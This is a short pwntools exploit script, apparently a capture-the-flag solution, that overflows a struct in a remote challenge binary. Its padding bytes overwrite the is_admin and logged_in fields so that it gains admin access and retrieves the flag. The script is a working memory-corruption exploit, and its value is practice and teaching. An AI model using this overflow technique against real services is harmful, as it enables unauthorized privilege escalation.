from pwn import *
import shutup

shutup.please()

def login(p: process):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', b'spooky')
    p.sendlineafter(b'> ', b'spooky')

elf = context.binary = ELF('./main')
# p = elf.process()
# p = remote('localhost', 1024)
p = remote('ksuctf-struct-account-t.chals.io', 443, ssl=True, sni='ksuctf-struct-account-t.chals.io')

payload = b''
payload += b'A'*16                 # overwrite username
payload += b'B'*16                 # overwrite password
payload += pack(0x1)               # overwrite is_admin  = 0x1 (true)
payload += pack(0x1)               # overwrite logged_in = 0x1 (true)

print()
info('Payload: ')
print('USERNAME  : A*16')
print('PASSWORD  : B*16')
print('IS_ADMIN  : 0x1')
print('LOGGED_IN : 0x1')
print()

print(payload)

info(f'Sending payload of size : {len(payload)}')

login(p)
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', payload)
login(p)
p.sendlineafter(b'> ', b'3')
flag = p.recvline(False).decode()
success('Received flag!')

info(f'Flag: {flag}')
